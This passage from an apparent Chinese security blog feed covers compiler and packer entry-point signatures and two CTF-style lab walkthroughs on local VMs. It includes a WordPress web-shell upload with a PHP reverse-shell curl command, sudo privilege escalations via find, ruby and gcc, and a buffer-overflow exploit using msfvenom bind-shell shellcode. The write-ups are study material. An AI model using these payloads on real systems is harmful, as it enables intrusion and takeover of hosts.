class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0040163C &gt; $ &#x2F;EB 10         JMP SHORT BCLOCK.0040164E</span><br><span class="line">0040163E     |66            DB 66                                    ;  CHAR &#39;f&#39;</span><br><span class="line">0040163F     |62            DB 62                                    ;  CHAR &#39;b&#39;</span><br><span class="line">00401640     |3A            DB 3A                                    ;  CHAR &#39;:&#39;</span><br><span class="line">00401641     |43            DB 43                                    ;  CHAR &#39;C&#39;</span><br><span class="line">00401642     |2B            DB 2B                                    ;  CHAR &#39;+&#39;</span><br><span class="line">00401643     |2B            DB 2B                                    ;  CHAR &#39;+&#39;</span><br><span class="line">00401644     |48            DB 48                                    ;  CHAR &#39;H&#39;</span><br><span class="line">00401645     |4F            DB 4F                                    ;  CHAR &#39;O&#39;</span><br><span class="line">00401646     |4F            DB 4F                                    ;  CHAR &#39;O&#39;</span><br><span class="line">00401647     |4B            DB 4B                                    ;  CHAR &#39;K&#39;</span><br><span class="line">00401648     |90            NOP</span><br><span class="line">00401649     |E9            DB E9</span><br><span class="line">0040164A   . |98E04E00      DD OFFSET BCLOCK.___CPPdebugHook</span><br><span class="line">0040164E   &gt; \A1 8BE04E00   MOV EAX,DWORD PTR DS:[4EE08B]</span><br><span class="line">00401653   .  C1E0 02       SHL EAX,2</span><br><span class="line">00401656   .  A3 8FE04E00   MOV DWORD PTR DS:[4EE08F],EAX</span><br><span class="line">0040165B   .  52            PUSH EDX</span><br><span class="line">0040165C   .  6A 00         PUSH 0                                   ; &#x2F;pModule &#x3D; NULL</span><br><span class="line">0040165E   .  E8 DFBC0E00   CALL &lt;JMP.&amp;KERNEL32.GetModuleHandleA&gt;    ; \GetModuleHandleA</span><br><span class="line">00401663   .  8BD0          MOV EDX,EAX</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="delphi入口点特征"><a href="#delphi入口点特征" class="headerlink" title="delphi入口点特征"></a>delphi入口点特征</h3><p>有很明显的规律，让人感觉很整齐。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00509CB0 &gt; $  55            PUSH EBP</span><br><span class="line">00509CB1   .  8BEC          MOV EBP,ESP</span><br><span class="line">00509CB3   .  83C4 EC       ADD ESP,-14</span><br><span class="line">00509CB6   .  53            PUSH EBX</span><br><span class="line">00509CB7   .  56            PUSH ESI</span><br><span class="line">00509CB8   .  57            PUSH EDI</span><br><span class="line">00509CB9   .  33C0          XOR EAX,EAX</span><br><span class="line">00509CBB   .  8945 EC       MOV DWORD PTR SS:[EBP-14],EAX</span><br><span class="line">00509CBE   .  B8 20975000   MOV EAX,unpack.00509720</span><br><span class="line">00509CC3   .  E8 84CCEFFF   CALL unpack.0040694C</span><br></pre></td></tr></table></figure><h3 id="vb-5-6入口点特征"><a href="#vb-5-6入口点特征" class="headerlink" title="vb 5/6入口点特征"></a>vb 5/6入口点特征</h3><p>一个push一个call，往上一堆jmp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00401166  - FF25 6C104000   JMP DWORD PTR DS:[&lt;&amp;MSVBVM60.#100&gt;]      ; MSVBVM60.ThunRTMain</span><br><span class="line">0040116C &gt;  68 147C4000     PUSH PACKME.00407C14</span><br><span class="line">00401171    E8 F0FFFFFF     CALL &lt;JMP.&amp;MSVBVM60.#100&gt;</span><br><span class="line">00401176    0000            ADD BYTE PTR DS:[EAX],AL</span><br><span class="line">00401178    0000            ADD BYTE PTR DS:[EAX],AL</span><br><span class="line">0040117A    0000            ADD BYTE PTR DS:[EAX],AL</span><br><span class="line">0040117C    3000            XOR BYTE PTR DS:[EAX],AL</span><br><span class="line"></span><br><span class="line">或省略第一行的JMP</span><br><span class="line"></span><br><span class="line">00401FBC &gt;  68 D0D44000        push dumped_.0040D4D0</span><br><span class="line">00401FC1    E8 EEFFFFFF        call &lt;jmp.&amp;msvbvm60.ThunRTMain&gt;</span><br><span class="line">00401FC6    0000               add byte ptr ds:[eax],al</span><br><span class="line">00401FC8    0000               add byte ptr ds:[eax],al</span><br><span class="line">00401FCA    0000               add byte ptr ds:[eax],al</span><br><span class="line">00401FCC    3000               xor byte ptr ds:[eax],al</span><br><span class="line">00401FCE    0000               add byte ptr ds:[eax],al</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="vc-6-0入口点特征"><a href="#vc-6-0入口点特征" class="headerlink" title="vc++6.0入口点特征"></a>vc++6.0入口点特征</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00496EB8 &gt;&#x2F;$  55            PUSH EBP                                 ;  (初始 cpu 选择)</span><br><span class="line">00496EB9  |.  8BEC          MOV EBP,ESP</span><br><span class="line">00496EBB  |.  6A FF         PUSH -1</span><br><span class="line">00496EBD  |.  68 40375600   PUSH Screensh.00563740</span><br><span class="line">00496EC2  |.  68 8CC74900   PUSH Screensh.0049C78C                   ;  SE 处理程序安装</span><br><span class="line">00496EC7  |.  64:A1 0000000&gt;MOV EAX,DWORD PTR FS:[0]</span><br><span class="line">00496ECD  |.  50            PUSH EAX</span><br><span class="line">00496ECE  |.  64:8925 00000&gt;MOV DWORD PTR FS:[0],ESP</span><br><span class="line">00496ED5  |.  83EC 58       SUB ESP,58</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="dasm入口点特征"><a href="#dasm入口点特征" class="headerlink" title="dasm入口点特征"></a>dasm入口点特征</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00401000 &gt;&#x2F;$  6A 00         PUSH 0                                   ; &#x2F;pModule &#x3D; NULL</span><br><span class="line">00401002  |.  E8 C50A0000   CALL &lt;JMP.&amp;KERNEL32.GetModuleHandleA&gt;    ; \GetModuleHandleA</span><br><span class="line">00401007  |.  A3 0C354000   MOV DWORD PTR DS:[40350C],EAX</span><br><span class="line">0040100C  |.  E8 B50A0000   CALL &lt;JMP.&amp;KERNEL32.GetCommandLineA&gt;     ; [GetCommandLineA</span><br><span class="line">00401011  |.  A3 10354000   MOV DWORD PTR DS:[403510],EAX</span><br><span class="line">00401016  |.  6A 0A         PUSH 0A                                  ; &#x2F;Arg4 &#x3D; 0000000A</span><br><span class="line">00401018  |.  FF35 10354000 PUSH DWORD PTR DS:[403510]               ; |Arg3 &#x3D; 00000000</span><br><span class="line">0040101E  |.  6A 00         PUSH 0                                   ; |Arg2 &#x3D; 00000000</span><br><span class="line">00401020  |.  FF35 0C354000 PUSH DWORD PTR DS:[40350C]               ; |Arg1 &#x3D; 00000000</span><br></pre></td></tr></table></figure><h2 id="常见壳的入口点特征"><a href="#常见壳的入口点特征" class="headerlink" title="常见壳的入口点特征"></a>常见壳的入口点特征</h2><h3 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h3><ul><li><p>upx pusha开头</p></li><li><p>aspcak pusha开头</p></li><li><p>掘北 push 开头</p></li></ul><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">置入代码 (&#123; 235, 8, 83, 84, 95, 83, 84, 69, 78, 68 &#125;) &#39; Code_Confusion标记结尾</span><br><span class="line">&#x2F;&#x2F;Code_Elimination 是代码清除标记，允许您选择一部分代码在运行后从内存中删除；使用此标记的目的是为了防止破解者从内存中转储出完整的程序代码。</span><br><span class="line">置入代码 (&#123; 235, 8, 79, 67, 95, 83, 84, 65, 82, 84 &#125;) &#39; Code_Elimination标记开始</span><br><span class="line">置入代码 (&#123; 235, 8, 79, 67, 95, 79, 67, 69, 78, 68 &#125;) &#39; Code_Elimination标记结尾</span><br><span class="line">&#x2F;&#x2F;Decode_onExec 是动态解码标记，允许您选择一部分只在执行时才解密的代码段；这部分代码仅在需要执行时才解码，执行前和执行后均处于加密状态</span><br><span class="line">置入代码 (&#123; 235, 8, 68, 89, 95, 83, 84, 65, 82, 84 &#125;) &#x2F;&#x2F; Decode_onExec标记开始</span><br><span class="line">置入代码 (&#123; 235, 8, 68, 89, 95, 68, 89, 69, 78, 68 &#125;) &#x2F;&#x2F; Decode_onExec标记结尾</span><br><span class="line">&#x2F;&#x2F;Decode_onReg 是注册解码标记，允许您选择一部分使用有效密钥才解密的代码；如果注册密钥不正确，那么这部分代码将永远处于加密状态。通俗地讲，这部分代码仅在注册版中执行</span><br><span class="line">&#x2F;&#x2F;源代码中可以使用任意数量的 Decode_onReg 标记，但是这些代码段在执行时会同时解密。注册解码标记主要用于激活未注册版中被限制的功能，使之注册成为完整版。</span><br><span class="line">置入代码 (&#123; 235, 8, 82, 68, 95, 83, 84, 65, 82, 84 &#125;) &#x2F;&#x2F; Decode_onReg标记开始</span><br><span class="line">置入代码 (&#123; 235, 8, 82, 68, 95, 82, 68, 69, 78, 68 &#125;) &#x2F;&#x2F; Decode_onReg标记结尾</span><br><span class="line">&#x2F;&#x2F;Zprotect_VM 是虚拟机加密标记，允许您选择一部分代码放到虚拟机中运行；虚拟机的指令系统是完全不同于现有的 x86 指令，可以有效阻止代码还原及分析</span><br><span class="line">置入代码 (&#123; 235, 8, 86, 77, 95, 83, 84, 65, 82, 84 &#125;) &#x2F;&#x2F; Zprotect_VM标记开始</span><br><span class="line">置入代码 (&#123; 235, 8, 86, 77, 95, 86, 77, 69, 78, 68 &#125;) &#x2F;&#x2F; Zprotect_VM标记结尾</span><br><span class="line">-----------适用于ZProtect V1.4.9.0版本---------</span><br><span class="line">VMProtect.易的SDK</span><br><span class="line">置入代码 (&#123; 235, 16, 86, 77, 80, 114, 111, 116, 101, 99, 116, 32, 98, 101, 103, 105, 110, 0 &#125;) &#39; VMP保护开始标志</span><br><span class="line">&#39;关键代码</span><br><span class="line">置入代码 (&#123; 235, 14, 86, 77, 80, 114, 111, 116, 101, 99, 116, 32, 101, 110, 100, 0 &#125;) &#39; VMP保护结束标志</span><br><span class="line">Enigma加密易语言的SDK</span><br><span class="line">置入代码 (&#123; 235, 10, 69, 67, 82, 79, 78, 69, 88, 69, 67, 66 &#125;)&#39; 标记开始处</span><br><span class="line">&#39;关键代码</span><br><span class="line">置入代码 (&#123; 235, 10, 69, 67, 82, 79, 78, 69, 88, 69, 67, 69 &#125;)&#39; 标记结束处</span><br><span class="line"></span><br><span class="line">NoobyProtect加密易语言的SDK</span><br><span class="line">置入代码 (&#123; 235, 6, 78, 80, 66, 69, 71, 78 &#125;)&#39; 标记开始处</span><br><span class="line">&#39;关键代码</span><br><span class="line">置入代码 (&#123; 235, 6, 78, 80, 69, 78, 68, 80 &#125;)&#39; 标记结束处</span><br><span class="line"></span><br><span class="line">穿山甲调用功能型加密易语言SDK的DEMO</span><br><span class="line">置入代码 (&#123; 235, 3, 214, 215, 1 &#125;)&#39; 标记开始处</span><br><span class="line">&#39;关键代码</span><br><span class="line">置入代码 (&#123; 235, 3, 214, 215, 0 &#125;)&#39; 标记结束处</span><br><span class="line">ASP加密易语言SDK</span><br><span class="line">置入代码 (&#123; 235, 4, 235, 5, 25, 1, 233, 37, 0 &#125;)&#39; 标记开始处</span><br><span class="line">&#39;关键代码</span><br><span class="line">置入代码 (&#123; 235, 4, 235, 5, 41, 1, 233, 133, 0, &#125;)&#39; 标记结束处</span><br><span class="line"></span><br><span class="line">Shielden 2.0.1.0 </span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 66, 69, 71, 78, 0 &#125;)  &#39; SE_PROTECT_START</span><br><span class="line">&#39; 关键代码</span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 69, 78, 68, 80, 0 &#125;)  &#39; SE_PROTECT_END</span><br><span class="line"></span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 66, 69, 71, 78, 77 &#125;)  &#39; SE_PROTECT_START_MUTATION</span><br><span class="line">关键代码</span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 69, 78, 68, 80, 0 &#125;)  &#39; SE_PROTECT_END</span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 66, 69, 71, 78, 85 &#125;)  &#39; SE_PROTECT_START_ULTRA</span><br><span class="line">关键代码</span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 69, 78, 68, 80, 0 &#125;)  &#39; SE_PROTECT_END</span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 66, 69, 71, 78, 86 &#125;)  &#39; </span><br><span class="line">&#39; 关键代码</span><br><span class="line">置入代码 (&#123; 235, 7, 83, 69, 69, 78, 68, 80, 0 &#125;)  &#39; SE_PROTECT_END</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>易语言插件推荐：EVA</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Plary</title>
      <link href="2021/01/23/Player/"/>
      <url>2021/01/23/Player/</url>
      
        <content type="html"><![CDATA[<p>环境情况</p><p>攻击机IP：192.168.56.137</p><p>靶机IP：192.168.56.139</p><p>个人评测难度：初级</p><p>nmap扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sS -oA Player 192.168.56.139</span><br></pre></td></tr></table></figure><p>开放端口：</p><p>80 web</p><p>3306 mysql</p><p><img src="https://img.rruu.net/image/6038175e8c325" alt="image-20210106111227069"></p><p>firefox查看80端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.139&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038177eb2428" alt="image-20210106111254506"></p><p>gobuster扫描目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -e -x php -t 50 -u http:&#x2F;&#x2F;192.168.56.139&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038178500626" alt="image-20210106111540874"></p><p>经过扫描没有任何有价值的地方，只能回去看80端口的默认页面，发现这里有一个比较奇怪的路径，我们的默认路径实在/var/www/html，我们尝试访问g@web。</p><p><img src="https://img.rruu.net/image/6038178a91b4b" alt="image-20210106111437274"></p><p>使用cmseek识别cms</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmseek</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038179077dbc" alt="image-20210106111715997"></p><p>检测结果为wordpress，使用wpscan扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.139&#x2F;g@web -e --api-token 你的token</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038179731ae0" alt="image-20210106112310008"></p><p>发现插件存在rce 我们查看漏洞说明 <a href="https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1">https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1</a></p><p><img src="https://img.rruu.net/image/6038179de5a84" alt="image-20210106122636395"></p><p>将exp复制保存为html，进行修改。</p><p><img src="https://img.rruu.net/image/603817a335ed8" alt="image-20210106122705521"></p><p>使用firefox打开</p><p><img src="https://img.rruu.net/image/603817a847ff7" alt="image-20210106122803604"></p><p>创建一个phtml文件</p><p><img src="https://img.rruu.net/image/603817ad72c62" alt="image-20210106122831906"></p><p>上传完毕</p><p><img src="https://img.rruu.net/image/603817b2c8a9e" alt="image-20210106122934459"></p><p>测试可以成功执行木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.139&#x2F;g@web&#x2F;wp-content&#x2F;uploads&#x2F;wpsp&#x2F;1609906866_test.phtml?magisec&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817b8d14b4" alt="image-20210106123020885"></p><p>使用php反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9000</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817bde0b88" alt="image-20210106124515633"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.56.139&#x2F;g@web&#x2F;wp-content&#x2F;uploads&#x2F;wpsp&#x2F;1609906866_test.phtml?magisec&#x3D;php%20%2Dr%20%27%24sock%3Dfsockopen%28%22192%2E168%2E56%2E137%22%2C9000%29%3Bexec%28%22%2Fbin%2Fsh%20%2Di%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817c2ef7a2" alt="image-20210106124625617"></p><p>python切换bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817c871f23" alt="image-20210106131801221"></p><p>进入mysql收集信息</p><p><img src="https://img.rruu.net/image/603817cd5a323" alt="image-20210106131820892"></p><p>使用密码登录用户，经过尝试发现hackNos@9012!!是security用户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su security</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817d2a24c0" alt="image-20210106131940254"></p><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817d815127" alt="image-20210106132041759"></p><p>使用find执行hackNos-boat用户的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hackNos-boat find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817dcdbc18" alt="image-20210106132911934"></p><p>python切换bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817e1a5ecd" alt="image-20210106133230061"></p><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817e6723f5" alt="image-20210106133322781"></p><p>使用ruby执行hunter用户的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hunter ruby -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817eb3c0c4" alt="image-20210106133407678"></p><p>python切换bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817f016ace" alt="image-20210106133455150"></p><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817f4c73a1" alt="image-20210106133516061"></p><p>使用gcc执行root用户的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -wrapper &#x2F;bin&#x2F;sh,-s .</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817f9e7046" alt="image-20210106133609598"></p><p>查看flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817feb6d3a" alt="image-20210106133628062"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>netstart</title>
      <link href="2021/01/20/netstart/"/>
      <url>2021/01/20/netstart/</url>
      
        <content type="html"><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p>靶机：192.168.56.140</p><p>攻击机：192.168.56.137</p><h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>nmap扫描端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p 21,2371 192.168.56.140 -A -oA netstart</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381757b70eb" alt="image-20210109145509460"></p><p>21 ftp 支持匿名访问，切存在文件</p><p>2371 </p><p>使用nc连接一下2371</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.140 2371</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038175e1136a" alt="image-20210109145616260"></p><p>下载exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.140</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038176385fd5" alt="image-20210109145927413"></p><p>查看文件</p><p><img src="https://img.rruu.net/image/60381769249c3" alt="image-20210109145949556"></p><p>放到win7中使用x32dbg调试</p><p><img src="https://img.rruu.net/image/6038176de4e36" alt="image-20210109150714262"></p><p>使用python运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fuzz.py</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381772cfe7f" alt="image-20210109150744853"></p><p>发现在1705时退出程序，我们编写py进一步测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer &#x3D; b&quot;A&quot; * 1705</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.132.144&quot;,2371))</span><br><span class="line">s.send((buffer))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>查看x32dbg，发现我们覆盖了EIP，且有3个A覆盖了，说明溢出值为1705-3=1702。</p><p><img src="https://img.rruu.net/image/60381777b853d" alt="image-20210109151137393"></p><p>我们搜索jmp esp</p><p><img src="https://img.rruu.net/image/6038177d1123c" alt="image-20210109151501510"></p><p>我们选择第一个，复制其地址625012B8</p><p><img src="https://img.rruu.net/image/6038178201601" alt="image-20210109151847493"></p><p>我们开始测试坏字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;for i in range(1,256): print(&#39;\\x%02x&#39; % i, end&#x3D;&#39;&#39;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038178707b84" alt="image-20210109152006108"></p><p>编辑poc.py</p><p><img src="https://img.rruu.net/image/6038178bb4d8d" alt="image-20210109152027061"></p><p>查找坏字符，转入eip寄存器中的内存，然后查看，发现2c以后的字符变成了b0，则2c后面的字符也就是2d是坏字符。我们去除2d并重新测试。</p><p><img src="https://img.rruu.net/image/6038179090bf0" alt="image-20210109152142697"></p><p>最终测试结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x2d\x2e\x46\x47\x59\x5e\x60</span><br></pre></td></tr></table></figure><p>使用msf生成弹窗payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;messagebox -f c -b &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817961db95" alt="image-20210109152357513"></p><p>编写poc脚本如下结果</p><p><img src="https://img.rruu.net/image/6038179c02b51" alt="image-20210109152447126"></p><p>重新运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817a13660b" alt="image-20210109152544564"></p><p>接下来已经完成了poc的编写验证了漏洞的存在，我们进行进一步的利用。使用msf生成linux shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;shell_bind_tcp -f c -b &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot; </span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817a6e425b" alt="image-20210109154045224"></p><p>编辑exploit</p><p><img src="https://img.rruu.net/image/603817ad41ad6" alt="image-20210109154128690"></p><p>先使用nc连接</p><p><img src="https://img.rruu.net/image/603817b356de5" alt="image-20210109154148646"></p><p>发现4444端口并未开放，我们使用exploit攻击。</p><p><img src="https://img.rruu.net/image/603817b9288c5" alt="image-20210109154217478"></p><p><img src="https://img.rruu.net/image/603817be213f3" alt="image-20210109154229111"></p><p>再次连接，发现成功利用。使用python切换bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817c4789e9" alt="image-20210109154314807"></p><p>sudo -l查看配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817c9cce34" alt="image-20210109154337302"></p><p>没有任何挑战性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603817ced2d15" alt="image-20210109154403766"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/603817d445a5d" alt="image-20210109154440582"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-9</title>
      <link href="2021/01/15/DC-9/"/>
      <url>2021/01/15/DC-9/</url>
      
